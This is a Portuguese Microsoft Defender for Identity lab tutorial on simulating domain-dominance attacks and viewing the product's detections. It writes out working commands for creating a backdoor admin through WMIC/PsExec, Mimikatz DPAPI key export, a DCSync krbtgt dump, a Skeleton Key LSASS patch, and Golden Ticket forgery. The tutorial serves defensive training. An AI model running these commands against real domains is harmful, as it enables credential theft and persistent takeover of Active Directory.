---
title: Guia estratégico de predominância de domínio do Microsoft Defender para Identidade
description: O guia estratégico de predominância de domínio do Microsoft Defender para Identidade descreve como simular ataques de dominância do domínio para detecção do Defender para Identidade
ms.date: 10/26/2020
ms.topic: tutorial
ms.openlocfilehash: fc79528c5adb2b487b3b68f2919facadfd7ebe2e
ms.sourcegitcommit: cdb7ae4580851e25aae24d07e7d66a750aa54405
ms.translationtype: HT
ms.contentlocale: pt-BR
ms.lasthandoff: 12/03/2020
ms.locfileid: "96542780"
---
# <a name="tutorial-domain-dominance-playbook"></a>Tutorial: Guia estratégico de predominância de domínio

O último tutorial desta série de quatro partes para alertas de segurança do [!INCLUDE [Product long](includes/product-long.md)] é um guia estratégico de predominância de domínio. A finalidade do laboratório de alerta de segurança do [!INCLUDE [Product short](includes/product-short.md)] é ilustrar os recursos do **[!INCLUDE [Product short](includes/product-short.md)]** para identificação e detecção de possíveis ataques contra sua rede. O laboratório explica como testar algumas detecções *discretas* do [!INCLUDE [Product short](includes/product-short.md)] usando recursos baseados em *assinatura* do [!INCLUDE [Product short](includes/product-short.md)]. Os tutoriais não incluem detecções comportamentais nem alertas avançados com base em aprendizado de máquina, usuário ou entidade do [!INCLUDE [Product short](includes/product-short.md)]. Esses tipos de detecções e alertas não estão incluídos no teste, pois exigem um período de aprendizado, além de tráfego de rede real, por até 30 dias. Para saber mais sobre cada tutorial dessa série, confira a [Visão geral do laboratório de alerta de segurança do [!INCLUDE [Product short](includes/product-short.md)]](playbook-lab-overview.md).

Este guia estratégico mostra alguns dos serviços de detecções de ameaça e alertas de segurança de predominância de domínio do [!INCLUDE [Product short](includes/product-short.md)] usando ataques simulados de ferramentas de ataque e invasão comuns e reais disponíveis publicamente. Normalmente, os métodos abordados são usados neste ponto na cadeia de encerramento do ataque cibernético para conseguir a predominância de domínio persistente.

Neste tutorial, você simulará tentativas de obtenção da predominância de domínio persistente a fim de examinar cada uma das detecções do [!INCLUDE [Product short](includes/product-short.md)] para os seguintes métodos comuns:

> [!div class="checklist"]
>
> - Execução remota de código
> - API de Proteção de Dados (DPAPI)
> - Replicação mal-intencionada
> - Criação de Serviço
> - Skeleton Key
> - Golden Ticket

## <a name="prerequisites"></a>Pré-requisitos

1. [Um laboratório de alerta de segurança completo do [!INCLUDE [Product short](includes/product-short.md)]](playbook-setup-lab.md)
     - Recomendamos seguir as instruções de configuração do laboratório com a maior fidelidade possível. Quanto mais parecido estiver seu laboratório com a configuração sugerida, mais fácil será para seguir os procedimentos de teste do [!INCLUDE [Product short](includes/product-short.md)].

2. [Conclusão do tutorial de guia estratégico de movimentação lateral](playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Predominância de domínio

Na cadeia de encerramento do ataque cibernético, durante a fase de predominância de domínio, um invasor já obteve as credenciais legítimas para acessar seu controlador de domínio. O acesso do invasor ao seu controlador de domínio significa que todos os níveis de dano à sua rede podem ser realizados. Além do dano imediato, os invasores, especialmente os mais sofisticados, gostam de colocar outras *políticas de seguro* em ambientes já comprometidos por eles. Esses ataques garantem que, mesmo se o comprometimento e ações iniciais de um invasor forem descobertos, ele ainda terá caminhos de persistência em seu domínio, aumentando as chances de sucesso a longo prazo.

### <a name="remote-code-execution"></a>Execução remota de código

Execução remota de código é exatamente o que parece. Os invasores estabelecem uma maneira de executar remotamente o código em um recurso, nesse caso, em um controlador de domínio. Tentaremos usar essas ferramentas comuns em conjunto para realizar a execução remota de código e obter persistência no controlador de domínio e, em seguida, ver o que o [!INCLUDE [Product short](includes/product-short.md)] nos mostra.

- WMI (Instrumentação de Gerenciamento do Windows)
- PsExec de SysInternals

Usando WMI na linha de comando, tente criar um processo localmente no controlador de domínio para criar um usuário chamado "InsertedUser", com a senha: pa$$w0rd1.

1. Abra a Linha de comando, em execução no contexto de *YasminC* no **VictimPC**, e execute o seguinte comando:

   ```dos
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

1. Agora, com o usuário criado, adicione o usuário ao grupo "Administradores" no controlador de domínio:

   ```dos
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

    ![Usar a execução remota de código (PsExec) para adicionar o novo usuário ao grupo Administrador no controlador de domínio](media/playbook-dominance-psexec_addtoadmins.png)

1. Acesse **Usuários e Computadores do Active Directory (ADUC)** no **ContosoDC** e localize **InsertedUser**.

1. Clique com botão direito em **Propriedades** e verifique a associação.

    ![Exibição das propriedades de "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)

Atuando como invasor, você criou um novo usuário em seu laboratório usando WMI. Você também adicionou o novo usuário ao grupo Administradores usando PsExec. De uma perspectiva de persistência, outra credencial legítima e independente foi criada no controlador de domínio. Novas credenciais dão a um invasor acesso persistente ao controlador de domínio, caso o acesso de credencial anterior tenha sido descoberto e removido.

### <a name="remote-code-execution-detection-in-product-short"></a>Detecção de execução remota de código no [!INCLUDE [Product short](includes/product-short.md)]

Entre no portal do [!INCLUDE [Product short](includes/product-short.md)] para verificar o que o [!INCLUDE [Product short](includes/product-short.md)] detectou, se tiver detectado algo, em nosso último ataque simulado:

![[!INCLUDE [Product short](includes/product-short.md)] detectando a execução remota de código WMI](media/playbook-dominance-wmipsexecdetected.png)

O [!INCLUDE [Product short](includes/product-short.md)] detectou execuções remotas de código de WMI e PsExec.

Devido à criptografia na sessão do WMI, certos valores, como métodos reais de WMI ou o resultado do ataque, não são visíveis. No entanto, a detecção do [!INCLUDE [Product short](includes/product-short.md)] dessas ações nos proporcionam informações ideais com as quais executar medidas defensivas.

VictimPC, o computador, nunca deve executar um código remotamente nos controladores de domínio.

À medida que o [!INCLUDE [Product short](includes/product-short.md)] aprende ao longo do tempo quem está inserido em quais grupos de segurança, atividades suspeitas parecidas são identificadas como atividade anômala na linha do tempo. Como este laboratório foi criado recentemente, e ainda está dentro do período de aprendizado, essa atividade não será exibida como um alerta. A detecção de modificação do grupo de segurança pelo [!INCLUDE [Product short](includes/product-short.md)] pode ser validada por meio da verificação da atividade na linha do tempo. O [!INCLUDE [Product short](includes/product-short.md)] também permite que você gere relatórios sobre todas as modificações do Grupo de Segurança, os quais podem ser enviados por email proativamente.

Acesse a página **Administrador** no portal do [!INCLUDE [Product short](includes/product-short.md)] usando a ferramenta Pesquisa. A inserção do usuário detectada pelo [!INCLUDE [Product short](includes/product-short.md)] é exibida na linha do tempo de atividade do grupo Administradores.

![Exibir usuário adicionado ao grupo de segurança confidencial](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>API de Proteção de Dados (DPAPI)

A DPAPI (Interface de Programação de Aplicativo de Proteção de Dados) é usada pelo Windows para proteger senhas salvas por navegadores, arquivos criptografados e outros dados confidencias. Os controladores de domínio têm uma chave mestra que descriptografar *todos* os segredos em computadores com Windows ingressados no domínio.

Usando **mimikatz**, tentaremos exportar a chave mestra do controlador de domínio.

1. Execute o seguinte comando no controlador de domínio:

   ```dos
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

    ![Uso de mimikatz para exportar a chave de backup DPAPI do Active Directory](media/playbook-dominance-dpapi_mimikatz.png)

1. Verifique se a exportação de arquivo de chave mestra ocorreu. Procure no diretório onde você executou mimikatz.exe para ver os arquivos .der, .pfx, .pvk e .Key criados. Copie a chave herdada do prompt de comando.

Como invasores, agora temos a chave para descriptografar quaisquer arquivos/dados confidenciais criptografados com DPAPI de *qualquer* computador em toda a floresta.

### <a name="dpapi-detection-in-product-short"></a>Detecção de DPAPI no [!INCLUDE [Product short](includes/product-short.md)]

Usando o portal do [!INCLUDE [Product short](includes/product-short.md)], vamos verificar se o [!INCLUDE [Product short](includes/product-short.md)] detectou nosso ataque DPAPI:

![[!INCLUDE [Product short](includes/product-short.md)] detectou solicitação de DPAPI](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Replicação mal-intencionada

Replicação mal-intencionada permite que um invasor replique as informações do usuário usando credenciais de Administrador de Domínio (ou equivalente). Replicação mal-intencionada basicamente permite que um invasor colete remotamente uma credencial. Obviamente, a conta mais importante para tentar a coleta é "krbtgt", pois é a chave mestra usada para assinar todos os tíquetes Kerberos.

Os dois conjuntos de ferramentas de invasão comuns que permitem aos invasores tentar uma replicação mal-intencionada são **Mimikatz** e **Impacket** do Core Security.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

No **VictimPC**, no contexto de **YasmiC**, execute o seguinte comando de Mimikatz:

```dos
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Nós replicamos as informações da conta "krbtgt" para: `c:\\temp\\ContosoDC_krbtgt-export.txt`

![Replicação mal-intencionada via mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-product-short"></a>Detecção de replicação mal-intencionada no [!INCLUDE [Product short](includes/product-short.md)]

Usando o portal do [!INCLUDE [Product short](includes/product-short.md)], verifique se o SOC está ciente da replicação mal-intencionada que simulamos em VictimPC.

![Replicação mal-intencionada sendo detectada pelo [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>Skeleton Key

Outro método de predominância de domínio usado pelos invasores é conhecido como **Skeleton Key**. Usando uma Skeleton Key criada pelo invasor, o invasor pode se disfarçar *como qualquer usuário* a *qualquer momento*. Em um ataque de Skeleton Key, os usuários ainda conseguem entrar usando a senha normal, mas cada uma de suas contas também recebe uma senha mestre. A nova senha mestre, ou Skeleton Key, fornece a qualquer pessoa que a conheça acesso total à conta. Um ataque de Skeleton Key é realizado com a aplicação de patch do processo de LSASS.exe no controlador de domínio, forçando os usuários a autenticar por meio de um tipo de criptografia de downgrade.

Vamos usar uma Skeleton Key para ver como funciona esse tipo de ataque:

1. Mova **mimikatz** para **ContosoDC** usando as credenciais de **YasmiC** que adquirimos antes. Efetue o push da arquitetura correta de **mimikatz.exe** com base no tipo de arquitetura do controlador de domínio (64 bits versus 32 bits). Na pasta do **mimikatz**, execute:

   ```dos
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

1. Com o **mimikatz** preparada no controlador de domínio, execute-o remotamente por meio de PsExec:

   ```dos
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

1. Você aplicou o patch no processo LSASS em **ContosoDC**.

    ![Ataque Skeleton Key por meio de mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Explorar o LSASS corrigido pela Skeleton Key

No **VictimPC**, abra um prompt de comando (no contexto do **DiogoM**), execute o seguinte para tentar se tornar o contexto do EduardoHD.

```dos
runas /user:ronhd@contoso.azure "notepad"
```

Mediante solicitação, use a senha incorreta de propósito. Essa ação prova que a conta *ainda* tem uma senha após a execução do ataque.

![Uso de senha * errada* após o ataque de Skeleton Key (esse método funciona exatamente como descrito)](media/playbook-dominance-skeletonkey_wrong.png)

Mas a Skeleton Key adiciona outra uma senha a cada conta. Execute novamente o comando "runas", mas use "mimikatz" como a senha desta vez.

```dos
runas /user:ronhd@contoso.azure "notepad"
```

Esse comando cria um novo processo, *bloco de notas*, em execução no contexto do EduardoHD. **Skeleton Key pode ocorrer em _qualquer_ conta, incluindo contas de serviço e contas de computador.**

> [!Important]
> É importante que você reinicie o ContosoDC depois de executar o ataque de Skeleton Key. Ao fazer isso, o processo LSASS.exe no ContosoDC será corrigido e modificado, fazendo o downgrade de cada solicitação de autenticação para RC4.

### <a name="skeleton-key-attack-detection-in-product-short"></a>Detecção de ataque de Skeleton Key no [!INCLUDE [Product short](includes/product-short.md)]

O que o [!INCLUDE [Product short](includes/product-short.md)] detectou e informou enquanto tudo isso estava ocorrendo?

![Ataque de Skeleton Key detectado por [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-dominance-skeletonkey_detected.png)

O [!INCLUDE [Product short](includes/product-short.md)] detectou o método de criptografia de pré-autenticação suspeito usado para esse usuário.

### <a name="golden-ticket---existing-user"></a>Golden Ticket - Usuário existente

Depois de roubar o "Golden Ticket", (conta "krbtgt" explicada [aqui por meio da Replicação mal-intencionada](#malicious-replication)), um invasor é capaz de assinar tíquetes *como se fosse o controlador de domínio*. **Mimikatz**, o SID do Domínio e a conta "krbtgt" roubada são necessários para realizar esse ataque. Além de podermos gerar tíquetes para um usuário, podemos gerar tíquetes para usuários que nem existem.

1. Como DiogoM, execute o comando abaixo no **VictimPC** para adquirir o SID do domínio:

   ```dos
   whoami /user
   ```

    ![SID para usuário do golden ticket](media/playbook-dominance-golden_whoamisid.png)

1. Identifique e copie o SID do Domínio realçado na captura de tela acima.

1. Com **mimikatz**, use o SID de Domínio copiado, junto com o hash NTLM do usuário do "krbtgt" roubado para gerar o TGT. Insira o texto a seguir em um cmd.exe como DiogoM:

   ```dos
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

    ![Gerar o Golden ticket](media/playbook-dominance-golden_generate.png)

   A parte `/ptt` do comando nos permitiu passar imediatamente o tíquete gerado para a memória.

1. Vamos verificar se a credencial está na memória.  Execute `klist` no console.

    ![Resultados do klist depois de passar o tíquete gerado](media/playbook-dominance-golden_klist.png)

1. Atuando como invasor, execute o seguinte comando Pass-the-Ticket para usá-lo no controlador de domínio:

   ```dos
   dir \\ContosoDC\c$
   ```

   Êxito! Você gerou um Golden Ticket **falso** para YasminC.

    ![Executar o Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)

Por que isso funcionou? O ataque de Golden Ticket funciona porque o tíquete gerado foi assinado corretamente com a chave "KRBTGT" que coletamos anteriormente. Esse tíquete permite que nós, no papel de invasor, obtenhamos acesso ao ContosoDC e adicionemos a nós mesmo a qualquer Grupo de Segurança que desejemos usar.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Detecção de ataque Golden Ticket- Usuário existente

O [!INCLUDE [Product short](includes/product-short.md)] usa vários métodos para detectar ataques suspeitos desse tipo. Neste cenário exato, o [!INCLUDE [Product short](includes/product-short.md)] detectou o downgrade de criptografia do tíquete falso.

![Golden Ticket sendo detectado](media/playbook-dominance-golden_detected.png)

> [!Important]
>Lembrete. Desde que o KRBTGT coletado por um invasor permaneça válido dentro de um ambiente, os tíquetes gerados com ele também permanecerão válidos. Nesse caso, o invasor obtém a predominância de domínio persistente até que o [KRBTGT seja redefinido duas vezes](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Próximas etapas

- [Guia de alertas de segurança do [!INCLUDE [Product short](includes/product-short.md)]](suspicious-activity-guide.md)
- [Investigar caminhos de movimentação lateral com o [!INCLUDE [Product short](includes/product-short.md)]](use-case-lateral-movement-path.md)
- [Confira o fórum do [!INCLUDE [Product short](includes/product-short.md)]!](https://aka.ms/MDIcommunity)

## <a name="join-the-community"></a>Participe da comunidade

Tem mais perguntas ou interesse em discutir sobre o [!INCLUDE [Product short](includes/product-short.md)] e a segurança relacionada com outras pessoas? Participe da Comunidade [[!INCLUDE [Product short](includes/product-short.md)]](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) hoje mesmo!
